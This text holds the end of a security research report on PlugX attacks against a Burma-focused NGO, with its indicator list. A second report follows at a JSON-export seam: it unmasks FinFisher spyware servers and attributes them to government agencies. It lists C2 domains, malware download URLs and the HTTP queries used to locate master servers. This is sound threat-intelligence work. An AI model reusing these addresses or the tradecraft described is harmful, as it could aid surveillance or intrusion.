Similar to the malware used in Attack 1, the PlugX samples found on the Ministry of Information website also rely on a McAfee Oem module for the DLL side loading attack. The sample found on the Union Election Commission website has closer similarities, as it uses the same legitimate McAfee executable (MD5 884d46c01c762ad6ddd2759fd921bf71) that we found in Attack 1.\nIn addition, the time frame of the attacks (May and August 215)  and the campaigns identified by Arbor Networks and Palo Alto Networks are broadly similar (June and August 2015).\nConnections to Campaigns Targeting Tibetan Groups\nOur analysis of Attacks 1 and 2 uncovered similarities in attack vectors, infrastructure, and malware with campaigns against groups in the Tibetan diaspora.\nThe use of Google Drive in the environmental NGO attacks is interesting as we have seen the same tactic used to deliver malware to Tibetan organizations during campaigns over May to July 2015. The use of Google Drive in these campaigns occur as Tibetan groups are promoting Google Drive as an alternative to sending file attachments to prevent infection from document-based malware. Beyond this common tactic, we also see infrastructure overlap that links the attacks to previous campaigns against Tibetan groups.\nThe C2 domain mailsecurityservice.com that was used in Attack 1 was registered with the same email (wojiaojilao2@sohu.com) as another C2 domain iyouthen.com that we identified on VirusTotal. Passive DNS records from PassiveTotal show that in March 2015, both domains also resolved to the same IP address 103.20.222.0.  We found an Evilgrab sample uploaded to  VirusTotal in March 2014 that connects to gmail.iyouthen.com (a subdomain of iyouthen.com). This sample is signed with a revoked certificate from Qindao Ruanmei Network Technology.\nA March 2012 report from Alienvault on attacks against Tibetan NGOs and the Central Tibetan Administration, found a variant of the Gh0St RAT malware family that includes an embedded executable that drops fxsst.dll, which is signed by the same revoked certificate. In addition to this similarity, in April 2012 we received an Evilgrab sample from an attack targeting a Tibetan NGO that connected to the C2 59.44.49.88, which was also used in the campaigns analyzed by Alienvault.\nConclusion\nFar from being an isolated campaign, the attacks that targeted this NGO are linked to recent campaigns against Burmese Government websites. The Palo Alto Networks report suggests that these attacks have also affected industry groups interested in the region.  Our analysis provides yet another example of a civil society group targeted as part of a wider campaign that includes government and the private sector. The threat actors responsible appear to be interested in monitoring the activities of groups with a stake in international investment and natural resource development in Burma. However, while industry groups and governments may benefit from well-resourced enterprise security support, civil society organizations typically do not have access to the same resources.\nThe further connections to previous campaigns against Tibetan organizations can be interpreted in two ways: either the attack group is the same, or there is a degree of infrastructure and tool sharing between multiple threat actors. Sharing between groups could be informal, or be coordinated via what Ned Moran describes as a “digital quartermaster,” which maintains and supplies threat infrastructure and malware development resources to multiple groups.  Based on our current findings, we are unable to make a definitive conclusion on which of these scenarios is most likely.\nAcknowledgements\nThanks to John Scott-Railton for comments on the post.\nIndicators\nAttack 1\nAttachment\nFile name: Permit.zip\nMD5: 53f81415ccedf453d6e3ebcdc142b966\nDrops\nFile name: ca-bundle.exe\nMD5:  c4c147bdfddffec2eea6bf99661e69ee\nFile name: mcf.exe\nMD5: 884d46c01c762ad6ddd2759fd921bf71\nFile name: mcutil.dll\nMD5: 56f0e67d981024ddcc215543698f44fb\nFile name: mcf.ep\nMD5: 7e0081fba718fcd71753d3199a290f03\nCommand and Control Server\nt1.mailsecurityservice[.]com\nt2.mailsecurityservice[.]com\nAttack 2\nAttachment\nFile name: Burma Gags Media Linked to Shwe Mann, Adding to Concerns About Reforms.zip\nMD5: 6701662097e274f3cd089ceec35471d2\nFile name: Burma Gags Media Linked to Shwe Mann, Adding to Concerns About Reforms.scr\nMD5: 699b3d90b050cae37f65c855ec7f616a\nDrops\nFile name: lsass.exe\nMD5: 5710d567d98a8f4a6682859ce3a35336\nFile name: XLBugHandler.dll\nMD5: cec071424d417a095221bf8992819388\nFile name: xlbug.dat\nMD5: 49ceba3347d39870f15f2ab0391af234 c\nCommand and Control Server\n198.44.190.85\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tAuthors: Bill Marczak, John Scott-Railton, Adam Senft, Irene Poetranto, and Sarah McKune\nMedia Coverage: Associated Press, The Hill, Motherboard, The Daily Caller, Hespress, Washington Post, Quartz, ZDNet, Softpedia, La Prensa Grafica.\nThis post describes the results of Internet scanning we recently conducted to identify the users of FinFisher, a sophisticated and user-friendly spyware suite sold exclusively to governments.  We devise a method for querying FinFisher’s “anonymizing proxies” to unmask the true location of the spyware’s master servers.  Since the master servers are installed on the premises of FinFisher customers, tracing the servers allows us to identify which governments are likely using FinFisher.  In some cases, we can trace the servers to specific entities inside a government by correlating our scan results with publicly available sources.  Our results indicate 32 countries where at least one government entity is likely using the spyware suite, and we are further able to identify 10 entities by name.  Despite the 2014 FinFisher breach, and subsequent disclosure of sensitive customer data, our scanning has detected more servers in more countries than ever before.\n \nExecutive Summary\nFinFisher is a sophisticated computer spyware suite, written by Munich-based FinFisher GmbH, and sold exclusively to governments for intelligence and law enforcement purposes.  Although marketed as a tool for fighting crime,1 the spyware has been involved in a number of high-profile surveillance abuses.  Between 2010 and 2012, Bahrain’s government used FinFisher to monitor some of the country’s top law firms, journalists, activists, and opposition political leaders.2  Ethiopian dissidents in exile in the United Kingdom3 and the United States4 have also been infected with FinFisher spyware.\nIn 2012 and 2013, Citizen Lab researchers and collaborators,5 published several reports analyzing FinFisher spyware, and conducted scanning that identified FinFisher command and control (C&C) servers in a number of countries.  In our previous research, we were not yet able to differentiate between FinFisher anonymizing proxies and master servers, a distinction that we make in this work.\nWhen a government entity purchases FinFisher spyware, they receive a FinSpy Master—a C&C server that is installed on the entity’s premises.6  The entity may then set up anonymizing proxies (also referred to as “proxies” or “FinSpy Relays” in the FinFisher documentation), to obscure the location of their master.  Infected computers communicate with the anonymizing proxy, which is “usually”7 set up on a Virtual Private Server (VPS) provider in a third country.  The proxy then forwards communications between a victim’s computer and the Master server.\nWe first describe how we scanned the Internet for FinFisher servers and distinguished masters from proxies (Part 1: Fishing for FinFisher).  We then outline our findings regarding 32 governments and 10 specific government entities that we believe are using FinFisher (Part 2: Country Findings).  Finally, we highlight several cases that illuminate connections between different threat actors (Part 3: A Deeper Analysis of Several Cases), before concluding (Conclusion).\n \nPart 1: Fishing for FinFisher\nIn this section, we describe our scans for FinFisher servers, and how we unmasked the true location of the master servers to identify governments using FinFisher.\nEach FinFisher sample includes the address of one or more C&C servers that the spyware reports back to.  These C&C servers are typically FinSpy Relays, which forward connections back and forth between a device infected with FinFisher, and a FinSpy Master.  The purpose of the FinSpy Relay is explicitly to make it “practically impossible” (their emphasis) for a researcher to discover “the location and country of the Headquarter [sic]”.8\n\nFigure 1: How targets infected with FinFisher communicate with the FinSpy Master via one or more FinSpy Relays.9\nWe employed zmap10 to scan the entire IPv4 Internet (/0) several times since the end of December 2014 and throughout 2015, using a new FinFisher server fingerprint that we devised by analyzing FinFisher samples.  Our scans yielded 135 servers matching our fingerprint, which we believe are a mix of FinSpy Masters and FinSpy Relays.\nWhen one queries a FinFisher server, or types the server’s address into a web browser, the server typically returns a decoy page. A decoy page is a page designed to disguise the fact that the server is a spyware server.  We found some variation in the decoy pages used by FinFisher servers that we detected, though the bulk used either www.google.com or www.yahoo.com. Peculiarly, FinSpy Relays appear to return decoy pages fetched by their FinSpy Master, rather than directly fetching the decoy pages themselves.  Thus, in many cases, the pages returned by the FinSpy Relays contain location data apparently about the FinSpy Master (e.g., certain Google and Yahoo pages embed the requester’s IP address or localized weather), which can reveal the location of FinSpy Masters.\nOkay Google, What is my IP?\nWe noticed that when we issued a query like “What is my IP address?” to a Google-decoy FinFisher server, the server would respond with a different IP address.  In the case below, a FinFisher server 206.190.159.xxx (located in the United States) reported that its IP address was the Indonesian IP 112.78.143.xxx, which matches a FinFisher server first detected in August 2012 by Claudio Guarnieri.11  We hypothesize that 206.190.159.xxx is a FinFisher proxy, designed to obscure the location of the FinFisher master, which is at 112.78.143.xxx.\n\nFigure 2: A FinFisher server in the US seems to be a proxy for a master in Indonesia.\nSpecifically, we sent queries of the form:\n\nGET /search?q=my+ip+address&nord=1 HTTP/1.1\r\nHost: [ip of server]\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0\r\n\n\nFigure 3: Queries we sent to Google-decoy FinFisher servers to reveal the IP address of the master.12\nThe fact that FinFisher proxies can apparently reveal the IP of the master is quite peculiar.  We illustrate below how we believe a query like “What is my IP address?” is routed through FinSpy Relays to the FinSpy Master:\n\nFigure 4: How we believe a “What is my IP address?” query is routed through FinSpy Relays to a FinSpy Master.\nIt appears that the “What is my IP Address?” query is delivered from our Measurement Machine by the FinSpy Relay to the FinSpy Master, and then submitted to Google by the FinSpy Master.  Therefore, Google returns the IP address of the FinSpy Master, which is then sent back to the Measurement Machine via the FinSpy Relay.\nHow’s the Weather in Caracas?\nA significant number of FinFisher servers we detected used www.yahoo.com as their decoy page.  While we were unable to devise a method to find the exact IP address of Yahoo-decoy FinFisher endpoints, we were still able to retrieve location information from Yahoo, by examining the userLocation object in the decoy page’s source code.  Yahoo utilizes a user’s location to customize several elements of Yahoo’s homepage, including weather and news.\n\nFigure 5: Weather conditions in Caracas returned by a FinFisher server in Lithuania.\nThe userLocation object returned by 185.8.106.xxx (located in Lithuania) is shown below:\n\n\"userLocation\":\r\n   {\"woeid\":395269,\r\n    \"zip\":\"Caracas\",\r\n    \"city\":\"Caracas\",\r\n    \"state\":\"Distrito Federal\",\r\n    \"country\":\"Venezuela\",\r\n    \"countryCode\":\"VE\",\r\n    ...}\n\nFigure 6: A FinFisher server in Lithuania seems to be a proxy for a master in Venezuela.\nThe userLocation object allows us to obtain city and country information for FinFisher endpoints, though we cannot determine their precise IP address.  We issued a query similar to the following to each Yahoo-decoy FinFisher server to obtain a page with the userLocation object:\n\nGET https://www.yahoo.com/ HTTP/1.1\r\nHost: www.yahoo.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0\n\nFigure 7: Queries we sent to Yahoo-decoy FinFisher servers to reveal the location of the master.13\nSince Yahoo, like Google, implements SSL redirection by default, we had to devise a method to talk to Yahoo in plain HTTP.  While Google provides the “nord=1” URL parameter to avoid SSL redirection, Yahoo apparently does not have an analogous publicized solution.  However, we found that by sending plain HTTP GET requests to the resource “https://www.yahoo.com/” we could communicate with www.yahoo.com in plain HTTP without triggering SSL redirection.\nOther Decoys\nWhile the majority of FinFisher servers we detected used either Google or Yahoo as a decoy page, we identified a number of other servers whose operators had apparently customized the decoy page to a different URL.\nOne server used the Italian news source libero.it as a decoy.  We noted that libero.it sets the “Libero” cookie, which contains the IP address of the computer that visited the libero.it website.  When accessing 185.8.106.xxx, the Libero-decoy FinFisher server, the cookie was set to include the Italian IP 93.146.250.xxx.14  Servers that we traced to Macedonia used Macedonian newsmagazine time.mk as a decoy.  Servers we traced to Taiwan used Taiwanese web portal pchome.com.tw as a decoy.  We were unable to trace other servers which used file download site filehippo.com as a decoy.  A handful of other untraceable servers returned custom HTML code as a decoy (e.g., a webpage with a META redirect to www.google.com).\nGeneral Comments\nThis design peculiarity is only the latest instance of fingerprintable anomalies in spyware decoy pages.  FinFisher competitor Hacking Team formerly used decoy pages on its C&C server for Remote Control System (RCS), but apparently removed them15 after our research revealed that anomalies in the decoy pages could be used to fingerprint RCS servers.16  We have also previously used decoy pages to fingerprint FinFisher servers.17  We believe that FinFisher or its clients may also be realizing that decoy pages are problematic, as we have observed fewer FinFisher servers returning decoy pages over time.\n \nPart 2: Country Findings\nIn this section, we provide a list of likely FinFisher government users identified by our scans, and also map out which FinSpy relays serve which FinSpy Masters.\nBelow, we identify 33 likely government users of FinFisher in 32 countries, based on the presence of a FinFisher master at an IP address in a country18 or belonging to a specific government department.\n\nFigure 8: Suspected FinFisher government users that were active at some point in 2015.\nIn presenting our scan results, we do not wish to disrupt or interfere with legitimately sanctioned investigations or other activities. Instead, we hope to ensure that citizens have the opportunity to hold their governments transparent and accountable.  To this end, we identify government users, but redact certain details we have discovered about their infrastructure whose disclosure might interfere with legitimately sanctioned activities.  Redacted details include the last octet of live IP addresses, and part of live domain names.  Appendix A contains a full list of countries and servers.\n\n\n\nCountry\nSpecific entity if

nor documents disclosed by Wikileaks19 had previously found evidence of a FinFisher deployment: Angola, Egypt, Gabon, Jordan, Kazakhstan, Kenya, Lebanon, Morocco, Oman, Paraguay, Saudi Arabia, Slovenia, Spain, Taiwan, Turkey, and Venezuela.  \nIn the diagram below, we map out FinFisher proxy networks: the FinSpy Relay servers we found, and the FinSpy Masters to which we linked them:\n\nFigure 9: Links we established between FinSpy Relays and FinSpy Masters.\nGiven previous reports that observed weaknesses in certain cryptography that FinFisher uses to transmit information from an infected device to the FinSpy master,20 locating FinFisher collection infrastructure in another country could potentially invoke concerns about “fourth party” collection, where a government collects data collected by another government’s surveillance operation.  We have also previously identified potential legal concerns regarding locating relays in other countries.21\nAttribution to Specific Entities\nWe attributed some FinFisher Master servers to specific government entities by correlating our scan results with publicly available data, including emails from FinFisher’s competitor Hacking Team.  This section briefly describes how we identified these entities, and summarizes what is publicly known about their functions.  While we do not provide a vignette for each country where we have identified FinFisher, we note that a number of countries have dubious or problematic histories of oversight of the security services.\nBangladesh\nDirectorate General of Forces Intelligence (DGFI)\nOur investigation uncovered a FinFisher server at an IP address in the same /30 as the mail server for Bangladesh’s DGFI, [redacted].dgfi.gov.bd.  Additionally, leaked Hacking Team emails claim that Bangladesh’s DGFI is a FinFisher customer.22\nEstablished in 1976, the Directorate General of Forces Intelligence (DGFI) is Bangladesh’s military intelligence agency. The director of the agency holds the rank of Lieutenant General or Major General and directly reports to the Prime Minister.23 In a report published in 2008, Human Rights Watch associated the DGFI with long-standing human rights violations (e.g., torture and extrajudicial killings) and the stifling of political opposition in the country.24\nThe US State Department has reported that the DGFI has previously conducted surveillance on citizens for their criticism of the government.25 Leaked emails show that DGFI officials were engaged in discussions with FinFisher’s competitor Hacking Team in June 2014.26\nBelgium\nFederal Police Service\nOur investigation found a FinFisher server in a /28 assigned to Belgacom, denoted “SKY-5904592 / SOCC-2131136.”  This range of IP addresses also contained several servers returning SSL certificates issued by and to “Federal Police.”  Two IP addresses in this range were also pointed to by two subdomains of raspol.be, a domain name registered to “Massimo Moschettini / ISRD NTSU / Police Fédérale.”\nBelgium’s Federal Police Service was established in January 2001. The agency is headed by a General Commissioner who coordinates the work of five general directorates, including administrative police, judicial police, operational support, logistics, and human resources, as well as several departments that report directly to him/her.27 Leaked Hacking Team emails have revealed the company’s participation in a tender for “tactical interception of communications via computer systems” by the Belgian Federal Police.28\nSerbia\nSecurity Information Agency (BIA)\nOur investigation found a FinFisher server in the same /26 as bia.gov.rs, the website of Serbia’s Security Information Agency (BIA).  The server was also in the same /28 as a computer that identified itself to Shodan as “DPRODAN-PC”.29  According to the leaked Hacking Team emails, a person with the email dprodan@open.telekom.rs contacted Hacking Team in reference to a February 8, 2012 demo in Belgrade.30  From February 7-9, 2012, Hacking Team was in Belgrade to give a demo to a potential client, Vladimir Djokic, who worked for the BIA according to his email address vladimirdj@bia.gov.rs.31  Thus, we believe “dprodan” is also a BIA employee, and the FinFisher server we found belongs to the BIA.\nSerbia’s Security Information Agency (BIA) was created in 2002 by the Law on the Security Information Agency. BIA is a civil national security service and a part of the security-intelligence system of the Republic of Serbia.32\nWhile the BIA is generally regarded as operating with appropriate oversight and as being free from major abuses, some elements of its electronic surveillance practices have been challenged. Prior to 2014, the Law on the Security Information Agency was considered to be not in compliance with the constitution. In 2012, a constitutional court struck down several provisions of the Law on the Security Information Agency, ruling that Articles 13, 14 and 15 of the Law, which govern the wiretapping of private communications, were unconstitutional.33 The court ruled that these Articles were “not formulated clearly and precisely enough” and that citizens are “thus prevented from ascertaining which legal rule will be applied in the given circumstances and are thus deprived of the possibility to protect themselves from inadmissible restrictions of their right or arbitrary interference in their right to respect of their private life and correspondence”.34 Further, measures related to the ability of the BIA’s Director to authorize wiretapping in some circumstances without a court order were also challenged.35 The court delayed its decision in order to give legislators the opportunity to revise the offending Articles in the Law.36 The amendments to the Law were adopted in June 2014.37 While acknowledged as a positive step, these amendments have been criticized as remaining “insufficient to fully democratize surveillance that is carried out by the BIA”.38\nLeaked emails indicate that members of the Security Information Agency and the Ministry of Defense engaged in purchase negotiations with FinFisher’s competitor Hacking Team.39\nEgypt\nTechnology Research Department\nWe found a FinFisher server at IP address 62.114.252.xxx.  We also found an email in the leaked Hacking Team emails that, according to the headers, was sent from the same IP address.40  The email was sent by Hacking Team employee Davide Romualdi on June 25, 2015, when he was scheduled to be performing delivery41 in Egypt for Hacking Team customer TREVOR, identified as the TRD42 (Technology Research Department).43  Thus, we believe the email was sent from the premises of the TRD, and the IP address 62.114.252.xxx belongs to the TRD.\nEgypt’s troubling human rights situation has continued to deteriorate under President Abdel Fattah al-Sisi. In recent years, cases of mass arrests, significant violence against protesters and due process violations have increased.44 Numerous Egyptian security agencies are permitted to conduct electronic surveillance, frequently with limited court oversight.  In somes, personal data improperly collected from civil society actors has led to their arrest and imprisonment.45 While there is limited open source information available about the activities of the Technology Research Department, we closely examine a malware campaign linked to TRD infrastructure in Part 3 of this report.\nIndonesia\nNational Encryption Body (Lembaga Sandi Negara)\nTwo of the FinFisher servers we found in Indonesia were in the same /28.  We found an IP address in this same /28 included in the headers of an email sent by a Hacking Team employee46 while he was in Indonesia47 performing a demo for the National Encryption Body.  The email was sent at 12:39 PM Jakarta time on February 6, 2013, and a meeting at the agency was set for 10:00 AM on the same day.48  Thus, it seems probable that the email was sent from the premises of the National Encryption Body, and that the two FinFisher servers belong to the same organization.\nThe National Encryption Body is an agency headed by a director, who has the same stature as a minister and reports directly to the President. In a recent interview, the Body’s current director, Major General Djoko Setyadi, describes the agency’s responsibilities as, among others, securing state secrets and decrypting/decoding communication from would-be terrorists.49\nThe threat of terrorism is a concern for Indonesia. Several bombing incidents have occurred in the country, including two Western hotels in the capital city of Jakarta in 2009. As the world’s largest Muslim-majority country, the emergence of the Islamic State of Iraq and the Levant (ISIL or ISIS) has also resulted in concerns that their militant ideology will gain ground. It is believed that as many as 200 Indonesian citizens have headed to Syria to fight with ISIS.50 Challenges from restive regions like Papua and Central Sulawesi are also ongoing. There are fears that the fight against these threats may be used as justification to perpetrate human rights abuses, such as to target others for their religious or political beliefs and to kill suspected militants unlawfully.\nIn 2013 Citizen Lab report, we identified at least twelve laws, two government regulations, and two ministerial regulations that govern wiretapping and interception in Indonesia. Although wiretapping and interception are helpful, and sometimes even necessary to expose crimes such as terrorism, drug trafficking and corruption, the lack of comprehensive legislation regulating their use in Indonesia means that there is an increased risk for misuse and privacy violations.51\nKenya\nNational Intelligence Service\nWe found a FinFisher server in a range of IP addresses registered to a Kenyan user named “National Security Intelligence.”  Kenya’s National Intelligence Service (NIS) was formerly known as the National Security Intelligence Service (NSIS).\nKenya’s NSIS replaced the former Directorate of Security Intelligence (DSI), commonly known as the “Special Branch”.52  The NIS is known as one of Kenya’s security institutions with the biggest budgetary allocation—along with the Kenya National Defence Forces and the National Police Service—and considered to be among the country’s critical security organs in the new constitution.53 In 2014, Human Rights Watch named the NIS, as well as the Anti-Terrorism Police Unit and other Kenyan intelligence agencies, as being implicated in abuses including torture, disappearances, and extrajudicial killings.54\nThe powers of the NIS were expanded significantly in December 2014 when the Parliament of Kenya rushed to pass the controversial Security Laws (Amendment) Bill.55 The amendments came following a series of deadly terrorist attacks by the militant group al-Shabab, including the 2013 killing of 67 people at the Westgate shopping mall in Nairobi.56 This bill expanded the powers of the NIS to monitor communications without a warrant, as well as expanding their powers to search and seize private property.57 Article 62 of the amended bill authorized NIS agents to “do anything necessary to preserve national security” and to detain individuals on simply the suspicion of engaging in acts which pose a threat to national security.58 Section 66 of the bill amended the National Intelligence Services Act, permitting the Director General of the NIS to monitor communications or “obtain any information, material, record, document or thing” in order to protect national security, without court oversight, leading rights organization Article 19 to argue that the amendment “effectively [gives] carte blanche to the Director-General to order mass surveillance of online communications”.59 While a court ruling in February 2015 struck down some provisions of the amendment, the provisions enhancing the powers of the NIS remained.60\nLebanon\nGeneral Directorate of General Security\nWe found a FinFisher server in a range of IP addresses registered to a Lebanese user named “General_Security.”  We assume that “General_Security” is a reference to the General Directorate of General Security.\nLebanon’s General Directorate of General Security was established in 1921 under Decree No. 1061.61 The functions of the General Security include collecting and gathering intelligence, monitoring the media, and issuing passports and travel documents to Lebanese citizens.62 The organization is categorized as a general directorate under the supervision of the Ministry of Internal Affairs.63\nAlthough Lebanon has legislation (Law No. 140) which establishes safeguards and oversight protecting electronic communications from unlawful surveillance, there is a systemic practice of this law being ignored.64 Privacy International has criticized the surveillance practices of Lebanon’s intelligence agencies, suggesting that the agencies, including the General Directorate of General Security, operate without sufficient independent oversight, and that a lack of trust between different agencies leads the groups to operate their own operations out of view of the Ministry of the Interior.65 Controversies surrounding government surveillance practices have become particularly salient in the wake of several recent high-profile assassinations, including the 2005 killing of Prime Minister Rafik Hariri. Organizations investigating the assassinations have had “unregulated access to the data of private citizens”, including mobile phone records, which raises privacy concerns.66\nInternal Security Forces\nWe found a FinFisher server at a Lebanese IP address that was formerly pointed to by what was apparently a mail server with domain “[redacted].intelligence.isf.gov.lb” in 2012.  We assume that the IP still belongs to the Internal Security Forces (ISF).\nThe Internal Security Forces (ISF) are the national police and security force of Lebanon.  The ISF’s creation was mandated by Decree 138 in 1959.67 Throughout its history, the ISF has had a troubled record of human rights abuses, in spite of recent efforts to promote proper conduct within the organization. In consultation with the UN Human Rights Office, the ISF adopted a January 2012 code of conduct designed to ensure the forces’ operations guaranteed respect for human rights and public freedoms, including “refraining from resorting to torture, cruel, inhumane and degrading treatment”.68 However, a number of incidents in recent years have called into questions the effectiveness of this code of conduct.\nAn extensive Human Rights Watch report in 2013 detailed dozens of instances of vulnerable individuals subject to physical abuse, torture and sexual assault at the hands of ISF officials.69 In June 2015, five ISF officers were arrested after videos released on social media showed the officers beating prisoners.70 The ISF and other state agencies have summoned and questioned bloggers, journalists, and activists over social media and blog posts critical of politicians.71\nThe organization also has a history of overreach in the collection of Lebanese citizens’ private user data. In 2012, it was reported that the ISF had requested that the Ministry of Telecommunications turn over the content of all SMS text messages sent over a two month span for all users in Lebanon, followed later by a request for Lebanese users’ login credentials for BlackBerry Messenger and Facebook.72 The request was made following the assassination of the ISF’s Information Branch head Wissam al-Hassan, and was rejected by the Ministry.73\nMorocco\nConseil Superieur De La Defense Nationale (CSDN) / Supreme Council of National Defense\nWe found a FinFisher server in a range of IP addresses registered to a Moroccan user named “Conseil Superieur De La Defense Nationale.”  We assume that this is a reference to the eponymous agency.\nThere is limited open source information available about the activities of the CSDN.  Leaked Hacking Team emails indicate that the CSDN — among other Moroccan Government agencies — was a customer of FinFisher’s competitor Hacking Team.\nIn 2012, spyware from Hacking Team was used against Mamfakinch, an award-winning group of Moroccan citizen journalists.74 Privacy International released a report detailing the impact of surveillance on the group, as well as other political activists and journalists.75\nMongolia\nState Special Security Department (SSSD)\nWe found a FinFisher server at a Mongolian IP address in the same /28 as an IP address pointed to by the domain “td.sssd.mn.”  We believe that “SSSD” is a reference to the Mongolian agency of the same name.  We also found what appears to be a test or demonstration FinFisher sample, whose bait content includes emails apparently between Gamma Group and Mongolia’s SSSD, discussing a visit by Gamma personnel to Mongolia.\nThere is limited open source information available about the SSSD; however, leaked emails from the spyware firm Hacking Team indicate that in 2012 the company was in contact with members of the SSSD.76 Additional leaked emails from 2013 indicate that Hacking Team scheduled a product demonstration with the SSSD in April 2013.77\n \nPart 3: A Deeper Analysis of Several Cases\nThe following section provides additional details for several countries \nEgypt: Use of FinFisher illuminates connections between different groups\nWe noted an interesting connection between Egypt’s Technology Research Department (TRD) and two other malware groups in the region: MOLERATS, and an as-yet uncharacterized group.  We have previously observed both groups targeting UAE-based activists.\nMOLERATS Attacks with FinFisher\nWe found an Egypt FinFisher sample, Egyptian_army.rar, hosted on google.wwwhost.biz.\n\nSHA256:   1610fc805f980f5c70cec8e138ba800b01ebc86919f42b375cfb161ce6365a48\r\nFilename: Egyptian_army.rar\n\nExtracting the .rar file yields an .exe file.\n\nSHA256:   94abf6df38f26530da2864d80e1a0b7cdfce63fd27b142993b89c52b3cee0389\r\nFilename: صور ذبح الكساسبة على يد داعش بعد انقضاء المهلة.exe\n\nThe name of the .exe file promises pictures of Jordanian Air Force pilot burned alive by ISIS, a popular news story at the time.\nWe suspect that the domain name google.wwwhost.biz is linked to MOLERATS, a threat actor active in the Middle East region that appears to engage in politically motivated targeting.  We describe the link below:\n\ngoogle.wwwhost.biz had IP address 200.74.241.111 at the same time as info.dynamic-dns.net, which also had IP address 192.161.48.59, shared with update.ciscofreak.com, which also had IP address 162.220.246.117.  This IP address is linked to several known MOLERATS domains, like natco{1,2,3,4,5}.no-ip.net,78 and uae.kim.79\ngoogle.wwwhost.biz also hosted two DarkComet samples, which communicated with r.ddns.me, which shared IP address 198.105.125.158 with a.ddns.me, which shared IP address 23.229.3.37 with MOLERATS domain test.cable-modem.org.80\ngoogle.wwwhost.biz also hosted a GMail phishing page, 64c1ef8e0923bf44aaa96caeb28a6c11, also hosted by googlecombq6xx.ddns.net, which shared IP address 131.72.136.28 with tvnew.otzo.com, which shared IP address 172.227.95.162 with  several known MOLERATS domains, like natco{1,2,3,4}.no-ip.net,81 and uae.kim.82\n\ngoogle.wwwhost.biz served a Hotmail phishing page, 57ab5f60198d311226cdc246598729ea, also served by google.com.r3irv2ykn0qnd7vr7sqv7kg2qho3ab5tngl5avxi5iimz1jxw9pa9.uae.kim; uae.kim is a known MOLERATS domain.83\n\nA significant portion of MOLERATS bait content we have observed indicates targeting of Israel and “political Islam” groups like Hamas.  This MOLERATS activity could be accounted for by any number of intelligence agencies active in the region, or a Palestinian faction, but it is also possible that MOLERATS is a multi-faceted group with several interests and/or clients.\nThat MOLERATS apparently used spyware linked to the TRD suggests a possible connection between the TRD and MOLERATS.\nThe Curious Case of the Shared Exploit\nWe identified the following Word document uploaded to VirusTotal:\n\nSHA256:   22deea26981bc6183ac3945da8274111e7fd7a35fbb6da601348cc6d66240114\r\nFilename: تقرير سري للغاية.doc\n\nThe document, whose name translates to “A Highly Classifed Report” downloads a FinFisher sample from http://workingulf.net/DFServ.exe.\n\nSHA256:   e2ecf89a49c125e0b4292645a41b5e97c0f7bf15d418faeac0d592205f083119\r\nFilename: DFServ.exe\n\nThe sample communicates with 50.31.252.xxx and 95.170.82.xxx, which are proxies for 62.114.252.xxx, the FinFisher Master we associated with Egypt’s TRD.  The domain workingulf.net appears to be connected to the TRD, because it is linked to a cluster of other domains, several of which were used to distribute TRD FinFisher samples.\nWe developed a fingerprint for the exploit, based on the presence of a 1.1MB binary embedded in the Word Document.  A week later, we identified another instance of this same exploit (the binary was the same).\n\nSHA256:   d759dcbebee18a65fda434ba1da5d348c16d9d3775fe1652a1dacf983ffc93b8\r\nFilename: المستجدات.doc\n\nThis instance downloaded spyware from http://wp.piedslibres.com/wp/wp-includes/js/Next.scr, which appeared to be a hacked WordPress site.\n\nSHA256:   08b32da8995ae094bfb703d7d975c3816cf04c075c32281e51158164d76cd655\r\nFilename: Next.scr\n\nNext.scr is a bespoke malware that exfiltrates system information and files via email.  The malware logs into an email account on the C&C server via SMTP, and sends mail to another account on the same server.  We have seen C&Cs including: pal4u.net, pal2me.net, and shop8d.net.  All of the domains have similar registrant information, indicating the work of a single group.\nThe group appears to be based in Palestine.  The use of a shared exploit suggests some link between the TRD and this group.\nFinFly Web in the Wild\nWe traced workingulf.net, to a number of other domain names, including news-youm7.com (see Figure 10 below).\n\nFigure 10: Domain names and IP addresses that we believe are associated with Egypt’s TRD.  We redact only live domains and IP addresses, and show full details for inactive ones.\nWe found a FinFly Web sample at http://videos.news-youm7.com/youm7/videos/5671264.html.  FinFly Web is a FinFisher product that allows customers to create a website to infect targets with spyware.  We identified the sample as FinFly Web given substantial similarity with leaked FinFly Web code.84\n\nFigure 11: The FinFly Web page, asking users to install Adobe Reader XI.  The download link points to a FinFisher spyware sample.\nThe FinFly Web page appears to have a number of deficiencies.  The attacker appears to have copied a page from the website of Egyptian newspaper Youm7, which appears in the background of the Adobe Reader popup.  The attacker apparently did not notice that the paths to the CSS resources are relative.  Thus, the attack page tries to fetch CSS stylesheets and images from the attack site, rather than the legitimate page.  Since the attacker neither copied these resources to the attack site, nor changed the relative paths to point to the legitimate site, the attack page looks malformatted.  The attacker made the same mistake with the news ticker IFRAME, resulting in the “Not Found” message in the background.  Also, the attacker entitled the page “Video: Islamic State Enters Egypt,” but created a popup to install Adobe Reader, which is Adobe’s product for viewing PDF files.  It is likely that the attacker instead wanted to create a popup to install Adobe Flash, a plugin for viewing web videos. Additionally, the download link points to a .rar file,85 which is suspicious as Adobe does not distribute its products in .rar files.  Finally, the .exe inside the .rar file is not melded with the Adobe Reader setup program, so a victim who executes the file may become suspicious when no Adobe setup program runs.\nItaly: Shift from Hacking Team to FinFisher?\nWe identified one IP address in Italy (2.228.65.xxx) which served as a FinFisher server from 2014 to present.  Earlier in 2014, and before our publication of our report on Hacking Team, the same IP address instead matched our fingerprint for Hacking Team spyware servers.  This might indicate an Italian government agency switching from Hacking Team to FinFisher.\nOman: Eagle Eye Digital Solutions LLC\nWe found a FinFisher server running on IP address 37.139.27.xxx, which is pointed to by two subdomains of to70.org, a domain name associated with an Omani company called “Eagle Eye Digital Solutions LLC” through historical WHOIS.  The domain is currently registered to “Omantel,” the largest telecom in Oman.  Eagle Eye Digital Solutions LLC was founded by, and is run by, Warith Al-Maawali.86  Leaked emails describe Warith as part of Oman’s Ministry of Interior, as well as a reseller of FinFisher products.87  Other sites apparently run by Eagle Eye include a major Omani online forum, “oman0.net.”  Eagle Eye founder Warith Al Maawali says the forum is “one of the most active sites with the largest user-base in Oman.”\nAn archived version of Eagle Eye’s website on the Wayback Machine showed Elaman GmbH as one of their partners, and “Security Organizations” as their clients.  Elaman is known to be a reseller of FinFisher products.88\n\nFigure 12: Old version of Eagle Eye’s website showing FinFisher reseller Elaman as a partner, and “Security Organizations” as among the firm’s 